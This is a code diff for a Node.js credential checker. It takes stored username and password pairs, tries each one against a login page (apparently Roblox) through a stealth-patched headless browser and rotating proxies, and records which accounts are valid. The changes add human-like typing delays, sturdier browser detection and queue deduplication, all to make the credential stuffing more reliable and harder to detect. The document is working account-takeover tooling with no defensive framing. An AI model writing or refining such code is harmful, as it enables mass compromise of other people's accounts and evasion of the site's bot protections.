@@ -1,5 +1,4 @@
 const fs = require('fs');
-const glob = require('glob');
 const admin = require('firebase-admin');
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
@@ -51,40 +50,40 @@ function getRandomProxy() {
   return proxies[Math.floor(Math.random() * proxies.length)];
 }
 
-// --- Chromium detection ---
-function findChromiumExecutable() {
-  // 1) explicit override
+/**
+ * Robustly find the Chromium executable path.
+ * Priority:
+ * 1. Environment variable PUPPETEER_EXECUTABLE_PATH
+ * 2. System-installed Chrome/Chromium (common on Render/Ubuntu)
+ * 3. Default Puppeteer-downloaded browser (via puppeteer.executablePath())
+ */
+function getExecutablePath() {
   if (process.env.PUPPETEER_EXECUTABLE_PATH) {
-    const p = process.env.PUPPETEER_EXECUTABLE_PATH;
+    return process.env.PUPPETEER_EXECUTABLE_PATH;
+  }
+
+  const commonPaths = [
+    '/usr/bin/google-chrome-stable',
+    '/usr/bin/chromium-browser',
+    '/usr/bin/google-chrome',
+    '/usr/bin/chromium',
+    '/opt/render/project/src/node_modules/puppeteer/.local-chromium/linux-1022525/chrome-linux/chrome', // specific legacy path
+  ];
+
+  for (const p of commonPaths) {
     if (fs.existsSync(p)) return p;
   }
 
-  // 2) common Render cache path (from build logs)
+  // Fallback to puppeteer's default discovery (which might fail if not installed correctly)
   try {
-    const cacheMatches = glob.sync('/opt/render/.cache/puppeteer/**/chrome*/*/chrome');
-    if (cacheMatches && cacheMatches.length) return cacheMatches[0];
-  } catch (e) {}
-
-  // 3) node_modules local chromium (puppeteer download location)
-  try {
-    const nodeMatches = glob.sync(path.join(__dirname, 'node_modules', 'puppeteer', '.local-chromium', '**', 'chrome-linux', 'chrome'));
-    if (nodeMatches && nodeMatches.length) return nodeMatches[0];
-  } catch (e) {}
-
-  // 4) fallback common linux paths
-  const possible = [
-    '/usr/bin/google-chrome-stable',
-    '/usr/bin/chromium-browser',
-    '/usr/bin/chrome',
-    '/usr/bin/chromium'
-  ];
-  for (const p of possible) if (fs.existsSync(p)) return p;
-
-  return null;
+    return require('puppeteer').executablePath();
+  } catch (e) {
+    return null;
+  }
 }
 
-const CHROME_EXECUTABLE = findChromiumExecutable();
-console.log('Detected Chromium executable:', CHROME_EXECUTABLE || 'none');
+const CHROME_EXECUTABLE = getExecutablePath();
+console.log('🚀 Puppeteer will use executable:', CHROME_EXECUTABLE || 'DEFAULT (Puppeteer Internal)');
 
 async function validateCredential(credential) {
   let browser = null;
@@ -102,17 +101,20 @@ async function validateCredential(credential) {
         `--proxy-server=${getRandomProxy()}`
       ]
     };
-    if (CHROME_EXECUTABLE) launchOpts.executablePath = CHROME_EXECUTABLE;
+
+    if (CHROME_EXECUTABLE) {
+      launchOpts.executablePath = CHROME_EXECUTABLE;
+    }
 
     browser = await puppeteer.launch(launchOpts);
 
     activeBrowsers++;
     const page = await browser.newPage();
 
-    await page.setDefaultTimeout(12000);
-    await page.setDefaultNavigationTimeout(12000);
+    await page.setDefaultTimeout(15000);
+    await page.setDefaultNavigationTimeout(15000);
 
-    // Block heavy resources
+    // Block heavy resources to save bandwidth and speed up
     await page.setRequestInterception(true);
     page.on('request', (req) => {
       const rt = req.resourceType();
@@ -123,45 +125,52 @@ async function validateCredential(credential) {
       }
     });
 
-    await page.goto(URL, { waitUntil: 'domcontentloaded' });
-    await page.waitForSelector('#login-username', { timeout: 8000 });
+    await page.goto(URL, { waitUntil: 'networkidle2' });
+    
+    // Check if we are actually on the login page
+    await page.waitForSelector('#login-username', { timeout: 10000 });
 
-    await page.fill('#login-username', credential.username);
-    await page.fill('#login-password', credential.password);
-    await page.click('button[type="submit"]');
+    // Using page.type for more human-like behavior
+    await page.type('#login-username', credential.username, { delay: 50 });
+    await page.type('#login-password', credential.password, { delay: 50 });
+    
+    await Promise.all([
+      page.click('button[type="submit"]'),
+      page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {})
+    ]);
 
-    // short wait for navigation/results
-    await new Promise(r => setTimeout(r, 2000));
-
-    const hasError = await page.$('.error, .alert, [class*="error"], [class*="invalid"]');
+    // Check for success/failure indicators
     const hasSettings = await page.$('span#nav-settings');
+    const hasError = await page.$('.error, .alert, [class*="error"], [class*="invalid"]');
 
-    if (hasError || !hasSettings) {
+    if (hasSettings) {
+      console.log(`✅ VALID: ${credential.username}`);
+      await db.collection('credentials').doc(credential.id).update({
+        status: 'valid',
+        processed_at: admin.firestore.FieldValue.serverTimestamp()
+      });
+      stats.valid++;
+      
+      // Try to logout to be clean
+      try {
+        await page.click('span#nav-settings');
+        await page.waitForSelector('a.rbx-menu-item.logout-menu-item', { timeout: 3000 });
+        await page.click('a.rbx-menu-item.logout-menu-item');
+      } catch (e) {}
+      
+      return 'valid';
+    } else {
+      console.log(`❌ INVALID: ${credential.username}`);
       await db.collection('credentials').doc(credential.id).update({
         status: 'invalid',
         processed_at: admin.firestore.FieldValue.serverTimestamp()
       });
       stats.invalid++;
-      console.log(`❌ INVALID: ${credential.username}`);
       return 'invalid';
     }
 
-    try {
-      await page.click('span#nav-settings');
-      await page.waitForSelector('a.rbx-menu-item.logout-menu-item', { timeout: 3000 });
-      await page.click('a.rbx-menu-item.logout-menu-item');
-    } catch (e) {}
-
-    await db.collection('credentials').doc(credential.id).update({
-      status: 'valid',
-      processed_at: admin.firestore.FieldValue.serverTimestamp()
-    });
-    stats.valid++;
-    console.log(`✅ VALID: ${credential.username}`);
-    return 'valid';
-
   } catch (error) {
-    console.error(`⚠️ ${credential.username}: ${error.message}`);
+    console.error(`⚠️ ${credential.username} Error: ${error.message}`);
     try {
       await db.collection('credentials').doc(credential.id).update({
         status: 'invalid',
@@ -203,7 +212,10 @@ async function scanAndQueue() {
       snapshot.docs.forEach(doc => {
         const data = doc.data();
         data.id = doc.id;
-        processingQueue.push(data);
+        // Avoid duplicates in queue
+        if (!processingQueue.find(q => q.id === data.id)) {
+          processingQueue.push(data);
+        }
       });
       stats.queue = processingQueue.length;
     }
@@ -215,7 +227,7 @@ async function scanAndQueue() {
 async function queueProcessor() {
   while (true) {
     await processQueue();
-    await new Promise(r => setTimeout(r, 500));
+    await new Promise(r => setTimeout(r, 1000));
   }
 }
 
@@ -240,8 +252,9 @@ app.get('/api/pending', async (req, res) => {
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Validator running on port ${PORT}`));
-
-console.log('⏰ Scanning every 10 seconds | Queue system active');
-scanAndQueue();
-queueProcessor().catch(console.error);
+app.listen(PORT, () => {
+  console.log(`🚀 Validator running on port ${PORT}`);
+  console.log('⏰ Scanning every 10 seconds | Queue system active');
+  scanAndQueue();
+  queueProcessor().catch(console.error);
+});
